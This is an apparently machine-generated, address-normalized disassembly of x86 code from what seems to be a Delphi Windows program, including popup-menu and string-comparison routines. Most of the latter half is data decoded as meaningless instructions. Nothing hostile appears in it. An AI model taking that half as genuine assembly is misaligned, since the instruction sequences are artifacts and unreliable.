mov eax edx
pop esi
retn
cmp [ eax + 0x41 ] 0x0
je r-xdata
cmp [ eax + 0x30 ] 0x1
sete dl
add eax 0x58
call sub_3aa2aec
test eax eax
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
call sub_3ace334
mov edx eax
jmp r-xdata
mov si 0xffc7
call sub_3a6457c
mov edx eax
jmp r-xdata
sub_3aa9194
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov edi ecx
mov esi edx
mov ebx eax
mov ecx esp
mov edx edi
mov eax esi
call sub_3a78df4
mov edx esp
mov eax ebx
call sub_3aa9244
mov eax ebx
call sub_3aa90fc
mov edx ebx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x3c ]
xor edx edx
mov eax [ ebx + 0x34 ]
call sub_3aa7280
xor edx edx
mov eax [ ebx + 0x34 ]
call sub_3aa7768
mov eax [ ebx + 0x34 ]
call sub_3aa3a18
mov eax ebx
call sub_3aa833c
mov eax ebx
call sub_3aa9148
and eax 0x7f
lea eax [ eax + eax * 2 ]
lea eax [ eax * 2 + rw-data ]
movzx edx [ ebx + 0x60 ]
movzx ebp [ eax + edx * 2 ]
movzx eax [ ebx + 0x68 ]
or bp [ eax * 2 + rw-data ]
movzx ebp bp
movzx eax [ ebx + 0x69 ]
shl eax 0xa
or ebp eax
push 0x0
mov eax [ rw-data ]
mov eax [ eax + 0x10 ]
push eax
push 0x0
push edi
push esi
push ebp
mov eax [ ebx + 0x34 ]
call sub_3aa3b48
push eax
call TrackPopupMenu
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
sub_3aa9244
push esi
push edi
add esp 0xfffffff8
mov esi edx
lea edi [ esp ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov edx [ esp ]
mov [ eax + 0x58 ] edx
mov edx [ esp + 0x4 ]
mov [ eax + 0x5c ] edx
pop ecx
pop edx
pop edi
pop esi
retn
sub_3aa9264
push ebx
push esi
push edi
push ebp
mov ebp edx
mov edi eax
mov eax [ edi + 0x4 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
inc esi
xor ebx ebx
inc ebx
dec esi
jne r-xdata
mov eax [ edi + 0x4 ]
mov edx ebx
call sub_3a7a494
xor edx edx
mov [ eax ] edx
mov eax [ edi + 0x4 ]
mov edx ebx
call sub_3a7a494
cmp ebp [ eax ]
jne r-xdata
sub_3aa92a0
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
push edi
mov esi ecx
lea edi [ ebp - 0x15 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov edi edx
mov [ ebp - 0x4 ] eax
mov eax [ rw-data ]
cmp [ eax ] 0x4
jg r-xdata
mov bl 0x1
mov eax [ rw-data ]
cmp [ eax ] 0x4
jne r-xdata
test bl bl
je r-xdata
cmp [ ebp - 0x5 ] 0x0
je r-xdata
xor ebx ebx
jmp r-xdata
mov eax [ rw-data ]
cmp [ eax ] 0x0
jg r-xdata
mov edx 0xff000004
mov eax [ edi + 0x14 ]
call sub_3a89b20
mov edx 0xff000007
mov eax [ edi + 0xc ]
call sub_3a89220
test [ ebp + 0x8 ] 0x80
je r-xdata
mov edx 0xff00000d
mov eax [ edi + 0x14 ]
call sub_3a89b20
mov edx 0xff00000e
mov eax [ edi + 0xc ]
call sub_3a89220
jmp r-xdata
cmp [ ebp - 0x5 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
mov si 0xfff2
call sub_3a6457c
mov edx [ r-xdata ]
call sub_3a6450c
mov [ ebp - 0x5 ] al
test [ ebp + 0x8 ] 0x1
je r-xdata
mov edx 0xff000004
mov eax [ edi + 0x14 ]
call sub_3a89b20
mov edx 0xff000011
mov eax [ edi + 0xc ]
call sub_3a89220
jmp r-xdata
movzx eax [ ebp + 0x8 ]
push eax
movzx eax [ ebp - 0x5 ]
push eax
lea ecx [ ebp - 0x15 ]
mov edx edi
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x30 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
test bl bl
jne r-xdata
sub_3aa9388
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov esi edx
mov ebx eax
mov eax esi
mov edx ebx
call sub_3a652f4
mov edi 0x1
jmp r-xdata
mov eax [ esi ]
call sub_3a65560
cmp edi eax
jle r-xdata
mov eax [ esi ]
movzx eax [ eax + edi - 0x1 ]
mov edx [ rw-data ]
movzx eax al
bt [ edx ] eax
jae r-xdata
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax [ esi ]
cmp [ eax + edi - 0x1 ] 0x26
jne r-xdata
inc edi
jmp r-xdata
inc edi
mov eax [ rw-data ]
cmp [ eax + 0xc ] 0x0
je r-xdata
xor ebx ebx
cmp edi 0x1
jle r-xdata
mov eax esi
mov ecx 0x1
mov edx edi
call sub_3a657d8
mov edx edi
dec edx
mov eax esi
mov ecx 0x4
call sub_3a657d8
jmp r-xdata
mov [ esp + 0x4 ] 0x0
mov eax [ esi ]
mov [ esp ] eax
mov ebp [ esp ]
test ebp ebp
je r-xdata
mov [ esp + 0x5 ] 0x0
mov eax [ esi ]
cmp [ eax + edi - 0x2 ] 0x28
sete [ esp + 0x5 ]
jmp r-xdata
sub ebp edi
cmp ebp 0x2
setge [ esp + 0x4 ]
jmp r-xdata
sub ebp 0x4
mov ebp [ ebp ]
mov [ esp + 0x6 ] 0x0
mov eax [ esi ]
cmp [ eax + edi + 0x1 ] 0x29
sete [ esp + 0x6 ]
jmp r-xdata
cmp [ esp + 0x5 ] 0x0
je r-xdata
cmp [ esp + 0x4 ] 0x0
je r-xdata
test bl bl
je r-xdata
movzx ebx [ esp + 0x6 ]
jmp r-xdata
sub_3aa9478
push ebx
push esi
push edi
push ebp
mov ebp edx
mov esi eax
mov eax ebp
call sub_3a652a0
mov ebx 0x1
mov eax esi
test eax eax
je r-xdata
mov edi eax
cmp edi ebx
jl r-xdata
sub eax 0x4
mov eax [ eax ]
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax [ rw-data ]
movzx edx [ esi + ebx - 0x1 ]
movzx edx dl
bt [ eax ] edx
jae r-xdata
cmp [ esi + ebx - 0x1 ] 0x26
jne r-xdata
inc ebx
jmp r-xdata
inc ebx
cmp edi ebx
jge r-xdata
mov eax edi
sub eax ebx
dec eax
jl r-xdata
inc ebx
cmp [ esi + ebx - 0x1 ] 0x26
je r-xdata
mov eax ebp
movzx edx [ esi + ebx - 0x1 ]
call sub_3a65488
sub_3aa94e0
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_3aa9583
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x8 ]
mov eax ebx
call sub_3aa9388
mov edi [ ebp - 0x8 ]
lea edx [ ebp - 0xc ]
mov eax esi
call sub_3aa9388
mov eax [ ebp - 0xc ]
mov [ ebp - 0x4 ] eax
mov [ ebp - 0x10 ] edi
mov ebx [ ebp - 0x10 ]
test ebx ebx
je r-xdata
mov esi [ ebp - 0x4 ]
test esi esi
je r-xdata
sub ebx 0x4
mov ebx [ ebx ]
push esi
mov eax [ ebp - 0x4 ]
call sub_3a65730
push eax
push ebx
mov [ ebp - 0x10 ] edi
mov eax [ ebp - 0x10 ]
call sub_3a65730
push eax
push 0x1
push 0x400
call CompareStringA
sub eax 0x2
test eax eax
sete al
mov ebx eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3aa958a
lea eax [ ebp - 0xc ]
mov edx 0x2
call sub_3a652c4
retn
sub esi 0x4
mov esi [ esi ]
sub_3aa9622
scasd [ edi ]
add esi eax
pop ss
mov al 0x3
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_3aa968c
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3aa9693
retn
mov eax [ rw-data ]
call sub_3a64380
mov eax [ rw-data ]
call sub_3a64380
mov eax [ rw-data ]
call sub_3a64380
mov eax rw-data
call sub_3a652a0
mov eax rw-data
mov ecx 0x12
mov edx [ r-xdata ]
call sub_3a65e38
sub_3aa9698
pushfd
xchg esi eax
stosb [ edi ]
add eax [ ecx ]
or al 0x54
dec ebp
outsd
popad
insb
push edx
jae r-xdata
inc ebx
outsd
insb
je r-xdata
je r-xdata
outsd
insb
jae r-xdata
add [ eax ] al
add [ eax + 0x7fffffff ] al
add edx eax
inc ebp
cmpsb [ esi ] [ edi ]
add ebx [ eax ]
inc ebx
cmpsb [ esi ] [ edi ]
add esi [ ebx + eax * 2 ]
stosb [ edi ]
nop
mov eax 0x103aa96
pop es
push esp
inc ebx
jne r-xdata
inc eax
add [ edi + edx * 4 - 0x56 ] dh
add eax [ eax ]
add [ eax ] al
add edx esp
int 0xaa
add eax esp
int 0xaa
add ebx esp
inc ebp
cmpsb [ esi ] [ edi ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
cwde
xchg edi eax
stosb [ edi ]
add edi [ eax + eax ]
add [ eax ] al
rcl [ eax ] 0xa6
add ecx eax
inc ebp
cmpsb [ esi ] [ edi ]
jae r-xdata
stosb [ edi ]
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + ebp * 4 - 0x69 ] si
stosb [ edi ]
add eax [ edi ]
or edx [ esp + eax * 2 + 0x72 ]
popad
dec edi
bound ebp [ edx + 0x65 ]
arpl [ esp + esi * 2 - 0x69 ] si
stosb [ edi ]
add edx [ ecx + edx ]
cmpsb [ esi ] [ edi ]
add eax [ eax ]
add [ eax ] cl
inc ebx
outsd
outsb
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x3c03aa97 ] bl
add [ eax ] al
add al al
adc [ esi - 0x59ba37fd ] ah
jb r-xdata
add esi [ ebp + ecx * 8 - 0x56 ]
add esi [ esi + ecx * 8 ]
stosb [ edi ]
add esp esp
int 0xaa
add edx [ esi ]
push esp
inc edx
popad
jae r-xdata
outsd
insb
jae r-xdata
add [ eax + 0x7fffffff ] al
add [ eax ] al
mov eax eax
rcl [ esi + 0x60303aa ] 0x1
push esp
inc ecx
insb
imul esp [ edi + 0x6e ] 0x1
add [ esi ] al
add [ eax ] al
add ah cl
xchg esi eax
stosb [ edi ]
add eax [ esi ]
popad
insb
dec esi
outsd
outsb
add eax 0x6f546c61
jo r-xdata
add [ eax ] cl
cdq
stosb [ edi ]
add ecx [ eax ]
inc esp
jb r-xdata
add eax esp
int 0xaa
add ebx esp
inc ebp
cmpsb [ esi ] [ edi ]
add edx eax
inc ebp
cmpsb [ esi ] [ edi ]
add ebx [ eax ]
inc ebx
cmpsb [ esi ] [ edi ]
add esi [ ebx + eax * 2 ]
cmpsb [ esi ] [ edi ]
add esi [ eax + 0x43 ]
cmpsb [ esi ] [ edi ]
add ebx [ eax - 0x32 ]
stosb [ edi ]
add edx [ eax - 0x33 ]
stosb [ edi ]
add ecx [ ebp + ecx * 8 - 0x56 ]
add ebx [ esp + ecx * 8 ]
stosb [ edi ]
add ecx [ eax ]
into
stosb [ edi ]
add esp eax

add [ ebx - 0x5567e740 ] cl
add eax [ eax ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + ebx * 4 - 0x56 ] al
add eax [ eax + eax ]
add [ eax ] ch
xchg edi eax
stosb [ edi ]
add ecx eax
inc ebp
cmpsb [ esi ] [ edi ]
add edx esp
int 0xaa
push es
popad
insb
dec esp
je r-xdata
popad
insb
inc edx
outsd
je r-xdata
add [ eax ] al
int3
add [ eax ] al
or [ ecx + 0x4803aa ] bl
inc ebx
outsd
outsb
je r-xdata
or [ ecx + 0x6c ] ah
inc ebx
insb
imul esp [ ebp + 0x6e ] 0x6c610874
inc ebx
jne r-xdata
popad
insb
push edx
imul esp [ edi + 0x68 ] 0x6c610874
cmpsb [ esi ] [ edi ]
add esi [ eax + 0x43 ]
cmpsb [ esi ] [ edi ]
add ebx eax

inc ebx
outsd
insd
int 0xaa
add ebx esp
inc ebp
cmpsb [ esi ] [ edi ]
outsd
insb
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + edx * 4 + 0x60 ] si
cwde
stosb [ edi ]
add eax [ edi ]
push ss
push esp
inc edx
popad
jae r-xdata
add ecx [ ebx ]
push esp
inc esp
jb r-xdata
push 0x6c03aacd
int 0xaa
je r-xdata
add ebx [ eax ]
inc ebx
cmpsb [ esi ] [ edi ]
add esi [ ebx + eax * 2 ]
cmpsb [ esi ] [ edi ]
add esi [ eax + 0x43 ]
cmpsb [ esi ] [ edi ]
add ebx [ eax - 0x32 ]
stosb [ edi ]
add ecx [ esi + ecx * 8 - 0x315bfc56 ]
stosb [ edi ]
add ebx [ esp + ecx * 8 ]
rol [ ebp - 0x5a ] 0x1
inc esp
jb r-xdata
add esi [ ebp + ecx * 8 - 0x56 ]
stosb [ edi ]
add ebp [ eax - 0x33 ]
stosb [ edi ]
add ebp [ ebp + ecx * 8 - 0x56 ]
outsb
je r-xdata
insd
or [ ebx + 0x6f ] al
add edx eax
inc ebp
cmpsb [ esi ] [ edi ]
inc ebx
outsd
outsb
je r-xdata
stosb [ edi ]
add ecx [ eax ]
into
stosb [ edi ]
add esp eax

stosb [ edi ]
add esp [ esi + ecx * 8 - 0x33e3fc56 ]
outsd
insb
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + ebx - 0x68 ] si
stosb [ edi ]
add esp [ edi + edx * 4 + 0x3aa ]
or [ ebx + 0x6f ] al
outsb
je r-xdata
stosb [ edi ]
add edx eax
into
stosb [ edi ]
add esi [ esi + ecx * 8 ]
stosb [ edi ]
add esp esp
int 0xaa
add edx [ edx ]
push esp
inc esp
jb r-xdata
outsd
insb
jae r-xdata
stosb [ edi ]
add esp [ esi + ecx * 8 - 0x33e3fc56 ]
inc ebx
outsd
outsb
je r-xdata
add [ ebp - 0x6723ffc0 ] cl
stosb [ edi ]
add eax [ eax ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
int 0xaa
add edx eax
into
stosb [ edi ]
add esi [ esi + ecx * 8 ]
stosb [ edi ]
add esp esp
int 0xaa
add edx [ esp + edx * 2 ]
inc esp
jb r-xdata
stosb [ edi ]
add ecx [ eax ]
into
stosb [ edi ]
add esp eax

outsd
insb
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + edx * 4 + 0x68 ] si
cdq
stosb [ edi ]
add eax [ eax ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx + ebx * 4 + 0x4803aa ] dl
add [ eax ] al
nop
cwde
stosb [ edi ]
add ecx eax
inc ebp
cmpsb [ esi ] [ edi ]
add edx esp
int 0xaa
add esi eax
into
stosb [ edi ]
add ebx esp
inc ebp
cmpsb [ esi ] [ edi ]
add edx eax
inc ebp
cmpsb [ esi ] [ edi ]
add ebx [ eax ]
inc ebx
cmpsb [ esi ] [ edi ]
add esi [ ebx + eax * 2 ]
cmpsb [ esi ] [ edi ]
add esi [ eax + 0x43 ]
cmpsb [ esi ] [ edi ]
add ebx [ eax - 0x32 ]
stosb [ edi ]
add ecx [ esi + ecx * 8 - 0x315bfc56 ]
stosb [ edi ]
add ebx [ esp + ecx * 8 ]
stosb [ edi ]
add edx eax
shr [ edx - 0x5532b3fd ] 0x1
add ebx [ esp + ecx * 8 ]
stosb [ edi ]
add ecx [ edi + ecx * 8 - 0x341ffc56 ]
stosb [ edi ]
add ebp [ eax - 0x33 ]
stosb [ edi ]
inc ebx
outsd
outsb
je r-xdata
add ebp [ ebp + ecx * 8 - 0x56 ]
add esi [ ebp + ecx * 8 - 0x56 ]
add ebp esp
iretd
int 0xaa
outsd
insb
dec edi
bound ebp [ edx + 0x65 ]
arpl [ ebp + eax * 2 + 0x78 ] si
lea eax [ eax ]
clc
cdq
stosb [ edi ]
add eax [ eax ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] bh
0x7803aa 0x0
int3
sub_3aa98f3
add esi [ eax + 0x6c03aace ]
int 0xaa
add edx eax
into
stosb [ edi ]
add esi [ esi + ecx * 8 ]
stosb [ edi ]
add esp esp
int 0xaa
add edx [ edx ]
push esp
inc esp
jb r-xdata
stosb [ edi ]
add esp [ esi + ecx * 8 - 0x33e3fc56 ]
inc ebx
outsd
outsb
je r-xdata
int 0xaa
add edx eax
into
stosb [ edi ]
add esi [ esi + ecx * 8 ]
stosb [ edi ]
add esp esp
int 0xaa
add edx [ esp + edx * 2 ]
inc esp
jb r-xdata
stosb [ edi ]
add ecx [ eax ]
into
stosb [ edi ]
add esp eax

outsd
insb
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + edx * 4 + 0x68 ] si
cdq
stosb [ edi ]
add eax [ eax ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx + ebx * 4 + 0x4803aa ] dl
add [ eax ] al
nop
cwde
stosb [ edi ]
add ecx eax
inc ebp
cmpsb [ esi ] [ edi ]
add edx esp
int 0xaa
add esi eax
into
stosb [ edi ]
add ebx esp
inc ebp
cmpsb [ esi ] [ edi ]
add edx eax
inc ebp
cmpsb [ esi ] [ edi ]
add ebx [ eax ]
inc ebx
cmpsb [ esi ] [ edi ]
add esi [ ebx + eax * 2 ]
cmpsb [ esi ] [ edi ]
add esi [ eax + 0x43 ]
cmpsb [ esi ] [ edi ]
add ebx [ eax - 0x32 ]
stosb [ edi ]
add ecx [ esi + ecx * 8 - 0x315bfc56 ]
stosb [ edi ]
add ebx [ esp + ecx * 8 ]
stosb [ edi ]
add edx eax
shr [ edx - 0x5532b3fd ] 0x1
add ebx [ esp + ecx * 8 ]
stosb [ edi ]
add ecx [ edi + ecx * 8 - 0x341ffc56 ]
stosb [ edi ]
add ebp [ eax - 0x33 ]
stosb [ edi ]
inc ebx
outsd
outsb
je r-xdata
add ebp [ ebp + ecx * 8 - 0x56 ]
add esi [ ebp + ecx * 8 - 0x56 ]
add ebp esp
iretd
int 0xaa
outsd
insb
dec edi
bound ebp [ edx + 0x65 ]
arpl [ ebp + eax * 2 + 0x78 ] si
lea eax [ eax ]
clc
cdq
stosb [ edi ]
add eax [ eax ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] bh
0x7803aa 0x0
int3
sub_3aa997f
add esi [ eax + 0x6c03aace ]
int 0xaa
add edx eax
into
stosb [ edi ]
add esi [ esi + ecx * 8 ]
stosb [ edi ]
add esp esp
int 0xaa
add edx [ esp + edx * 2 ]
inc esp
jb r-xdata
stosb [ edi ]
add edx eax
shr [ edx - 0x5532b3fd ] 0x1
add ebx [ esp + ecx * 8 ]
stosb [ edi ]
add ecx [ edi + ecx * 8 - 0x341ffc56 ]
stosb [ edi ]
add ebp [ eax - 0x33 ]
stosb [ edi ]
inc ebx
outsd
outsb
je r-xdata
add ebp [ ebp + ecx * 8 - 0x56 ]
add esi [ ebp + ecx * 8 - 0x56 ]
add ebp esp
iretd
int 0xaa
outsd
insb
dec edi
bound ebp [ edx + 0x65 ]
arpl [ ebp + eax * 2 + 0x78 ] si
lea eax [ eax ]
clc
cdq
stosb [ edi ]
add eax [ eax ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] bh
0x7803aa 0x0
int3
sub_3aa9a78
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebx + 0x7803aa ] bl
add [ eax ] al
lodsb [ esi ]
cdq
stosb [ edi ]
add ecx eax
inc ebp
cmpsb [ esi ] [ edi ]
add edx esp
int 0xaa
add ebp eax
shr [ edx - 0x59ba23fd ] 0x1
add edx eax
inc ebp
cmpsb [ esi ] [ edi ]
add ebx [ eax ]
inc ebx
cmpsb [ esi ] [ edi ]
add esi [ ebx + eax * 2 ]
cmpsb [ esi ] [ edi ]
add ebx [ edi + ecx * 8 - 0x56 ]
add ebx [ eax - 0x32 ]
stosb [ edi ]
add edx eax
shr [ edx - 0x5532b3fd ] 0x1
add ebx [ esp + ecx * 8 ]
stosb [ edi ]
add ecx [ edi + ecx * 8 - 0x341ffc56 ]
stosb [ edi ]
add ebp [ eax - 0x33 ]
stosb [ edi ]
add ebp [ ebp + ecx * 8 - 0x56 ]
add esi [ ebp + ecx * 8 - 0x56 ]
add ebp esp
iretd
sub_3aa9ae7
add esi esp
into
stosb [ edi ]
add ebp [ eax + edx * 8 ]
stosb [ edi ]
add ebp [ eax - 0x43fc5530 ]
shr [ edx - 0x552f1ffd ] 0x1
add ebx esp
shr [ edx + 0x44541103 ] 0x1
jb r-xdata
cmpsd [ esi ] [ edi ]
add edx eax
stosb [ edi ]
cmpsd [ esi ] [ edi ]
add ebp [ eax - 0x6bfc575c ]
movsb [ edi ] [ esi ]
test al 0x3
push eax
jecxz r-xdata
inc esp
outsd
arpl [ ebx + 0x4f ] bp
bound ebp [ edx + 0x65 ]
arpl [ ebp + eax * 2 + 0x78 ] si
mov eax eax
pushad
fwait
stosb [ edi ]
add eax [ eax ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebx + ebx * 4 + 0x3aa ] cl
add ecx [ esi ]
push esp
inc ebx
outsd
outsb
je r-xdata
iretd
stosb [ edi ]
add esp [ eax + eax ]
add [ ebx + edi * 2 - 0x58 ] bl
add ecx eax
inc ebp
cmpsb [ esi ] [ edi ]
add edx esp
inc ebp
cmpsb [ esi ] [ edi ]
add ebx eax
inc ebp
cmpsb [ esi ] [ edi ]
inc ebp
cmpsb [ esi ] [ edi ]
add ebx [ eax ]
inc ebx
cmpsb [ esi ] [ edi ]
add esi [ ebx + eax * 2 ]
cmpsb [ esi ] [ edi ]
add edx [ ebx + ecx + 0xbe403ac ]
lodsb [ esi ]
add esi esp
cmp [ eax - 0x58552ffd ] ebp
outsd
insb
inc ebx
popad
outsb
jbe r-xdata
cmpsb [ esi ] [ edi ]
add ebx eax
inc ebp
cmpsb [ esi ] [ edi ]
outsd
add ebp [ edi + esi ]
test al 0x3
fadd [ ebp - 0x5a ]
add edx eax
jae r-xdata
jmp 0xffffffffed0ea0f4
test al 0x3
add ebx esp
inc ebp
cmpsb [ esi ] [ edi ]
add edx eax
inc ebp
cmpsb [ esi ] [ edi ]
add ebx [ eax ]
inc ebx
cmpsb [ esi ] [ edi ]
add esi [ ebx + eax * 2 ]
cmpsb [ esi ] [ edi ]
add ebx esp
test al 0x3
xchg esp eax
outsd
insb
inc ecx
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
lea eax [ eax ]
jo r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
js r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
mov [ ebx + 0x3aa ] ds
mov [ ebx + 0xe0703aa ] ds
push esp
inc ebx
outsd
outsb
je r-xdata
add ecx esp
cmp ch [ eax - 0x57bfcbfd ]
add ebx [ eax - 0x47fc53fc ]
adc [ ebx + eax + sub_3a83e08 ] ch
cmpsd [ esi ] [ edi ]
stosb [ edi ]
add eax [ edi ]
adc al 0x54
inc ebx
jne r-xdata
in al dx
cmp ch [ eax - 0x57c51bfd ]
add edx [ eax ]
test al 0x3
inc eax
or ebp [ ebx + eax + sub_3a840f4 ]
cwde
inc eax
test al 0x3
sub al 0x40
test al 0x3
pop esp
inc eax
test al 0x3
xor [ eax - 0x58 ] al
add ebp esp
add eax 0xee003ac
lodsb [ esi ]
add edi [ eax + 0xe ]
lodsb [ esi ]
add edx [ eax ]
adc ch [ ebx + eax + 0x75435414 ]
jae r-xdata
test al 0x3
shr [ edx + 0x3acc03a7 ] 0x1
test al 0x3
xor al 0x40
test al 0x3
cwde
add al 0xac
add edi [ eax + 0x803ac10 ]
test al 0x3
outsd
insb
inc ebx
popad
outsb
jbe r-xdata
in eax 0xaa
add edx [ eax ]
aas
je r-xdata
xchg esp eax
jae r-xdata
test al 0x3
add edx [ ebp + 0x3f1003aa ]
insd
inc ebx
outsd
outsb
je r-xdata
or ebp [ ebx + eax + sub_3ac0be4 ]
hlt
fwait
stosb [ edi ]
add ecx eax
jpo r-xdata
sbb al 0xe8
stosb [ edi ]
add eax [ edi + edi - 0x58 ]
add edx eax
call 0x423ea0a8
test al 0x3
sub [ edi ] bh
test al 0x3
jl r-xdata
outsd
insb
inc ecx
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
add [ edx + ebp * 4 - 0x53fccffd ] bl
add eax [ ebx ]
add [ eax ] cl
inc ebx
outsd
outsb
je r-xdata
add ebx esp
inc ebp
cmpsb [ esi ] [ edi ]
add edx eax
inc ebp
cmpsb [ esi ] [ edi ]
add ebx [ eax ]
inc ebx
cmpsb [ esi ] [ edi ]
add esi [ ebx + eax * 2 ]
cmpsb [ esi ] [ edi ]
add esp [ ebx ]
stosb [ edi ]
add esi [ ebx + ebp * 4 - 0x5443fc59 ]
add eax [ eax + eax ]
or [ ebx + 0x6f ] al
outsb
je r-xdata
mov al [ 0x5c03aae6 ]
or ch [ ebx + eax + sub_3aae728 ]
test [ edx ] cl
lodsb [ esi ]
add ebx [ eax - 0x3fc53f6 ]
call 0xffffffffeb1aa0cc
stosb [ edi ]
add edx esp
or ch [ ebx + eax + sub_3ac0ae8 ]
call 0x13ae4818
or ebp [ ebx + eax + sub_3aae844 ]
sbb [ ebx ] cl
lodsb [ esi ]
add ebp [ eax - 0x18 ]
stosb [ edi ]
add esp [ eax ]
or ebp [ ebx + eax + sub_3aae984 ]
jmp 0xffffffffed4ea0f8
outsd
insb
jae r-xdata
test al 0x3
outsd
insb
jae r-xdata
add [ eax + r-xdata ] dl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
jl r-xdata
add [ ebp - 0x63ffffc0 ] cl
stosb [ edi ]
add eax [ eax ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0x64 ] dh
stosb [ edi ]
add eax [ eax ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esp + ebx * 4 - 0x56 ] dl
add ebp [ eax + eax + 0x2500000 ]
lodsb [ esi ]
add esi eax
cmp eax 0x45d403a8
cmpsb [ esi ] [ edi ]
insd
inc ebx
outsd
outsb
je r-xdata
stosb [ edi ]
add ebx [ eax + eax ]
add [ eax ] al
pop eax
add ebp [ ebx + eax + sub_3a645c8 ]
aam 0x45
sub_3aa9fa4
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
sbb [ eax + 0x3aa ] ah
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x2003aa ] ah
add [ eax ] al
nop
jl r-xdata
push esp
inc ecx
outsb
arpl [ eax + 0x6f ] bp
jb r-xdata
add ecx eax
inc ebp
cmpsb [ esi ] [ edi ]
add edx esp
inc ebp
cmpsb [ esi ] [ edi ]
add ebx eax
inc ebp
cmpsb [ esi ] [ edi ]
add ebx esp
inc ebp
cmpsb [ esi ] [ edi ]
add edx eax
inc ebp
cmpsb [ esi ] [ edi ]
add ebx [ eax ]
inc ebx
cmpsb [ esi ] [ edi ]
add esi [ ebx + eax * 2 ]
cmpsb [ esi ] [ edi ]
add esp [ edx + ebp * 4 - 0x1b53fc59 ]
stosb [ edi ]
add edi [ ebx + ebp * 4 - 0x552ffc59 ]
cmpsd [ esi ] [ edi ]
add eax [ eax + 0x7003aae5 ]
in al 0xaa
